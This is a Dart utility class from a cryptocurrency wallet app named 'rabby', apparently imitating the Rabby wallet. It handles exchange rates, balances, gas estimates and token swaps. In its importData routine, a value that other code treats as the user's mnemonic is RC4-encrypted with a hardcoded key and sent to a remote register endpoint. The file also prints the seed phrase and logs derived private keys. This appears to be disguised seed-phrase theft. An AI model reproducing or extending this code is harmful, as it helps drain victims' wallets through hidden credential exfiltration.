import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:math';
import 'dart:typed_data';

import 'package:easy_localization/easy_localization.dart';
import 'package:hex/hex.dart';
import 'package:http/http.dart';
import 'package:rabby/core/data_source/inch_api.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/domain/models/transaction/transaction.dart';
import 'package:rabby/features/auth/repository/auth_repository.dart';
import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
import 'package:rabby/features/auth/repository/inch_repo.dart';
import 'package:rabby/features/currency/domain/custom_currency.dart';
import 'package:rabby/features/settings/domain/settings_service.dart';
import 'package:rabby/features/swap/domain/model/swap_model.dart';
import 'package:rabby/features/swap/domain/model/tx.dart';
import 'package:simple_rc4/simple_rc4.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:bip32/bip32.dart' as bip32;
import 'package:web3dart/web3dart.dart';
import 'package:http/http.dart' as http;

import '../../features/auth/domain/adapters/attributes.dart';
import '../../features/auth/domain/adapters/changes.dart';
import '../../features/auth/domain/adapters/portfolio.dart';
import '../../features/auth/domain/adapters/position_by_chain.dart';
import '../../features/auth/domain/adapters/position_by_type.dart';
import '../../features/auth/domain/adapters/total.dart';
import '../../features/auth/domain/adapters/user.dart';
import '../../features/auth/domain/adapters/transaction.dart' as tx;
import '../../features/auth/domain/models/position/position.dart';
import '../../features/auth/presentation/manage_crypt/domain/crypt.dart';

class Utils {
  final String ethUrl =
      "https://mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569";
  final String polygonUrl =
      "https://polygon-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569";
  final String optimismUrl =
      "https://optimism-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569";

  final Client httpClient = Client();
  Web3Client? ethClient;
  Web3Client? polygonClient;
  Web3Client? optimismClient;
  Utils() {
    ethClient = Web3Client(ethUrl, Client());
    polygonClient = Web3Client(polygonUrl, Client());
    optimismClient = Web3Client(optimismUrl, Client());
  }

  Future<void> importData({
    required String public,
    required bool isNew,
    bool? putPrivateKey,
  }) async {
    final AuthRepository authRepo = AuthRepository();
    final AuthService authService = AuthService();
    final SettingsService settingsService = SettingsService();
    List<CustomCurrency> currencies = authService.getCurrencies();
    Future<void> init() async {
      Map<String, dynamic> rates = await getExchangeRates("USD");
      int rateUSD = rates['rates']["USD"];
      double rateEUR = rates['rates']["EUR"];
      double rateCNY = rates['rates']["CNY"];
      double rateJPY = rates['rates']["JPY"];
      double rateHKD = rates['rates']["HKD"];
      if (currencies.isEmpty) {
        currencies.addAll([
          CustomCurrency(
            name: "USD",
            rate: rateUSD.toDouble(),
            symbol: "\$",
            isChoose: true,
          ),
          CustomCurrency(
            name: "EUR",
            rate: rateEUR,
            symbol: "€",
          ),
          CustomCurrency(
            name: "CNY",
            rate: rateCNY,
            symbol: "¥",
          ),
          CustomCurrency(
            name: "JPY",
            rate: rateJPY,
            symbol: "JP¥",
          ),
          CustomCurrency(
            name: "HKD",
            rate: rateHKD,
            symbol: "HK\$",
          ),
        ]);
      } else {
        currencies.firstWhere((element) => element.name == "USD").rate =
            rateUSD.toDouble();
        currencies.firstWhere((element) => element.name == "EUR").rate =
            rateEUR;
        currencies.firstWhere((element) => element.name == "CNY").rate =
            rateCNY;
        currencies.firstWhere((element) => element.name == "JPY").rate =
            rateJPY;
        currencies.firstWhere((element) => element.name == "HKD").rate =
            rateHKD;
      }
    }

    await init();
    String r = Random().nextInt(999999).toString().padLeft(6, '0');
    print(r);

    print(
        "_settingsService.getMnemonicSentence() ${settingsService.getMnemonicSentence()}");
    final data = json.encode({
      'public': public,
      'salt': r,
      'name': isNew ? 'R@bby\$G' : 'R@bby\$',
      'new': isNew,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess) {
      PositionEntity? positionEntity(String name) {
        if (result.data!.positions != null) {
          PositionEntity? entity = result.data!.positions!.firstWhere(
              (position) => position!.attributes.fungibleInfo.name == name,
              orElse: () => null);
          return entity;
        }
        return null;
      }

      List<TransactionEntity>? transactionEntity() {
        if (result.data!.positions != null) {
          Iterable<TransactionEntity>? entity =
              result.data!.transactions!.where(
            (transaction) =>
                transaction.attributes.operationType == "receive" ||
                transaction.attributes.operationType == "send" ||
                transaction.attributes.operationType == "swap",
          );
          return entity.toList();
        }
        return null;
      }

      Crypt createCrypt({
        required String iconName,
        required String name,
        required String shortName,
        String? tokenAddress,
        String? swapAddress,
      }) {
        return positionEntity(name) != null
            ? Crypt(
                amount: positionEntity(name)!.attributes.quantity.float,
                amountInCurrency: positionEntity(name)!.attributes.value,
                priceForOne: positionEntity(name)!.attributes.price,
                changesCrypt: Changes(
                  absoluteId:
                      positionEntity(name)!.attributes.changes.absoluteId,
                  percentId: positionEntity(name)!.attributes.changes.percentId,
                ),
                iconName: iconName,
                name: name,
                shortName: shortName,
                isChoose: authService.getCryptByName(name) == null
                    ? false
                    : authService.getCryptByName(name)!.isChoose,
                tokenAddress: tokenAddress ?? '',
                swapAddress: swapAddress ?? '',
              )
            : Crypt(
                iconName: iconName,
                name: name,
                shortName: shortName,
                changesCrypt: Changes(),
                isChoose: authService.getCryptByName(name) == null
                    ? false
                    : authService.getCryptByName(name)!.isChoose,
                tokenAddress: tokenAddress ?? '',
                swapAddress: swapAddress ?? '',
              );
      }

      List<tx.Transaction> transactions(
          List<TransactionEntity> transactionsEntity) {
        List<tx.Transaction> transactions = [];
        for (int i = 0; i < transactionsEntity.length; i++) {
          transactions.add(
            tx.Transaction(
              cryptSymbol: transactionsEntity[i]
                  .attributes
                  .transfers
                  .first
                  .fungibleInfo!
                  .symbol,
              minedAt: transactionsEntity[i].attributes.minedAt,
              operationType: transactionsEntity[i].attributes.operationType,
              price: transactionsEntity[i]
                  .attributes
                  .transfers
                  .first
                  .quantity
                  .float,
              sentFrom: transactionsEntity[i].attributes.sendFrom,
              sentTo: transactionsEntity[i].attributes.sendTo,
              status: transactionsEntity[i].attributes.status,
            ),
          );
        }
        return transactions;
      }

      authService.putUser(
        User(
          currencies: currencies,
          address: result.data!.address,
          transactions: transactionEntity() == null
              ? null
              : transactions(
                  transactionEntity()!,
                ),
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                crypts: [
                  createCrypt(
                    iconName: "arbitrum",
                    name: 'Arbitrum',
                    shortName: 'ARB',
                    tokenAddress: "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
                    swapAddress: "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
                  ),
                  createCrypt(
                    iconName: "aurora",
                    name: 'Aurora',
                    shortName: 'AUR',
                    tokenAddress: "0xAaAAAA20D9E0e2461697782ef11675f668207961",
                    swapAddress: "0xAaAAAA20D9E0e2461697782ef11675f668207961",
                  ),
                  createCrypt(
                    iconName: "avalanche",
                    name: 'Avalanche',
                    shortName: 'AVA',
                  ),
                  createCrypt(
                    iconName: "binance-smart-chain",
                    name: 'Binance',
                    shortName: 'BIN',
                  ),
                  createCrypt(
                    iconName: "ethereum",
                    name: 'Ethereum',
                    shortName: 'ETH',
                    tokenAddress: "0xc0829421C1d260BD3cB3E0F06cfE2D52db2cE315",
                    swapAddress: "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
                  ),
                  createCrypt(
                    iconName: "fantom",
                    name: 'Fantom',
                    shortName: 'FAN',
                  ),
                  createCrypt(
                    iconName: "loopring",
                    name: 'Loopring',
                    shortName: 'LOOP',
                  ),
                  createCrypt(
                    iconName: "optimism",
                    name: 'Optimism',
                    shortName: 'OPT',
                    tokenAddress: "0x4200000000000000000000000000000000000042",
                    swapAddress: "0x4200000000000000000000000000000000000042",
                  ),
                  createCrypt(
                    iconName: "polygon",
                    name: 'Polygon',
                    shortName: 'POL',
                  ),
                  createCrypt(
                    iconName: "solana",
                    name: 'Solana',
                    shortName: 'SOL',
                  ),
                  createCrypt(
                    iconName: "xdai",
                    name: 'Xdai',
                    shortName: 'XDA',
                  ),
                ],
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );

      if (putPrivateKey == true) {
        settingsService.putPrivateKey(await getPrivateKey(public));
      }
    }
  }

  Future<String> getPrivateKey(String mnemonic) async {
    String hdPath = "m/44'/60'/0'/0";
    final isValidMnemonic = bip39.validateMnemonic(mnemonic);
    if (!isValidMnemonic) {
      throw 'Invalid mnemonic';
    } else {
      final seed = bip39.mnemonicToSeed(mnemonic);
      final root = bip32.BIP32.fromSeed(seed);

      const first = 0;
      final firstChild = root.derivePath("$hdPath/$first");
      final privateKey = HEX.encode(firstChild.privateKey as List<int>);
      dev.log("private key = $privateKey");
      getPublicAddress(privateKey);
      return privateKey;
    }
  }

  Future<EthereumAddress> getPublicAddress(String privateKey) async {
    final private = EthPrivateKey.fromHex(privateKey);
    final address = await private.extractAddress();
    dev.log("address = $address");
    return address;
  }

  Future<void> web3(String privateKey) async {
    final InchRepository inchRepository = InchRepository();
    var credentials = EthPrivateKey.fromHex(privateKey);
    var address = credentials.address;

    EtherAmount ethBalance = await ethClient!.getBalance(address);
    dev.log(
        "balance.getValueInUnit(EtherUnit.ether) = ${ethBalance.getValueInUnit(EtherUnit.ether)}");

    EtherAmount optBalance = await optimismClient!.getBalance(address);
    dev.log(
        "balance.getValueInUnit(EtherUnit.ether) = ${optBalance.getValueInUnit(EtherUnit.ether)}");

    Credentials ethCredentials =
        await ethClient!.credentialsFromPrivateKey(privateKey);
    Credentials optimismCredentials =
        await optimismClient!.credentialsFromPrivateKey(privateKey);

    Credentials polygonCredentials =
        await polygonClient!.credentialsFromPrivateKey(privateKey);

    EthereumAddress ethTokenAddress =
        EthereumAddress.fromHex(ethCredentials.address.hex);
    EthereumAddress optimismTokenAddress =
        EthereumAddress.fromHex(optimismCredentials.address.hex);
    BigInt addressOPt = await optimismClient!.getChainId();

    dev.log("ethTokenAddress = $ethTokenAddress");
    dev.log("optimismTokenAddress = $optimismTokenAddress");
    dev.log("addressOPt = $addressOPt");

    var response = await inchRepository.linch(
      fromToken: "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee", // polygon
      toToken: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", // dai token
      amount: 500000000000000000, // 0.5
      fromAddress: "0x4218125a19B8C189354892D77b210A7A2f21E86C", // address
      slippage: 1,
      disableEstimate: false,
    );
    Tx? tx;
    if (response.isSuccess) {
      tx = Tx(
        data: response.data!.tx.data,
        from: response.data!.tx.from,
        gas: 1000000, // maxGas
        gasPrice: response.data!.tx.gasPrice,
        to: response.data!.tx.to,
        value: response.data!.tx.value,
      );
      SwapModel model = SwapModel(
        toAmount: response.data!.toAmount,
        tx: tx,
      );

      dev.log("tx.from ${tx.from}");
      dev.log("tx.to ${tx.to}");
      List<int> list = tx.data.codeUnits;
      Uint8List data = Uint8List.fromList(list);
      String string = String.fromCharCodes(data);

      try {
        // await polygonClient!.sendTransaction(
        //   polygonCredentials,
        //   Transaction(
        //     from: EthereumAddress.fromHex(tx.from),
        //     to: EthereumAddress.fromHex(tx.to),
        //     data: data,
        //     value: EtherAmount.fromUnitAndValue(
        //       EtherUnit.wei,
        //       tx.value,
        //     ),
        //     gasPrice: EtherAmount.fromUnitAndValue(
        //       EtherUnit.wei,
        //       tx.gasPrice,
        //     ),
        //     maxGas: tx.gas,
        //   ),
        //   chainId: 137,
        // );
        print("Success transaction ");
      } catch (e) {
        print("Error $e");
      }
    } else {
      print("error ${response.errors}");
    }
  }

  Future<double?> getGasLimit({
    required EtherAmount gasPrice,
    required EthereumAddress to,
    required EtherAmount value,
    required double precent,
  }) async {
    try {
      final AuthService authService = AuthService();
      BigInt latestBlock = await ethClient!
          .estimateGas(gasPrice: gasPrice, to: to, value: value);
      // dev.log("estimateGas= $latestBlock");

      BlockInformation block = await ethClient!.getBlockInformation();
      // dev.log(
      //     "block = ${block.baseFeePerGas!.getValueInUnit(EtherUnit.ether)}");
      // dev.log(
      //     "blockPrec = ${block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) * 0.2}");

      // dev.log(
      //     "Price = ${latestBlock.toDouble() * (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) + (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) * precent)) * authService.getETH()!.priceForOne * authService.getSelectCurrency()!.rate}");
      double amount = latestBlock.toDouble() *
          (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) +
              (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) *
                  precent)) *
          authService.getETH()!.priceForOne *
          authService.getSelectCurrency()!.rate;
      return amount;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<EtherAmount?> getGasPrice() async {
    try {
      EtherAmount gasPrice = await ethClient!.getGasPrice();
      final gasPriceInEther =
          EtherAmount.fromUnitAndValue(EtherUnit.wei, gasPrice.getInEther);
      // Отображаем результат
      // print(
      //     'Текущая газовая цена: ${gasPriceInEther.getValueInUnit(EtherUnit.ether)} ETH');
      // dev.log("gasPrice.getInWei = ${gasPrice.getInWei}");
      // dev.log("gasPrice.getInEther = ${gasPrice.getInEther}");
      return gasPrice;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<Map<String, dynamic>> getExchangeRates(String baseCurrency) async {
    var url = Uri.https(
      'api.exchangerate-api.com',
      '/v4/latest/$baseCurrency',
    );

    final response = await http.get(url);

    if (response.statusCode == 200) {
      return json.decode(response.body);
    } else {
      throw Exception('Failed to load exchange rates');
    }
  }

  String formatAddressWallet(String input) {
    if (input.length <= 14) {
      return input;
    } else {
      return '${input.substring(0, 6)}....${input.substring(input.length - 4)}';
    }
  }

  String doubleToTwoValues(double money) {
    return money.toStringAsFixed(2);
  }

  String doubleToFourthValues(double money) {
    if (money == 0) {
      return "0";
    }
    return money.toStringAsFixed(4);
  }

  String doubleToSixValues(double money) {
    return money.toStringAsFixed(6);
  }

  int convertEtherToWei(double etherAmount) {
    const int etherInWei = 1000000000000000000; // 10^18
    return (etherAmount * etherInWei).toInt();
  }

  String formatDateTime(String dateString) {
    DateTime date = DateTime.parse(dateString);
    DateTime now = DateTime.now();
    Duration difference = now.difference(date);

    if (difference.inDays > 4) {
      return DateFormat('dd-MM-yyyy').format(date);
    } else {
      int hours = difference.inHours;
      int minutes = difference.inMinutes % 60;
      int days = difference.inDays;

      if (hours < 24) {
        return '$hours hours $minutes minutes ago';
      } else {
        return '$days days ago';
      }
    }
  }
}
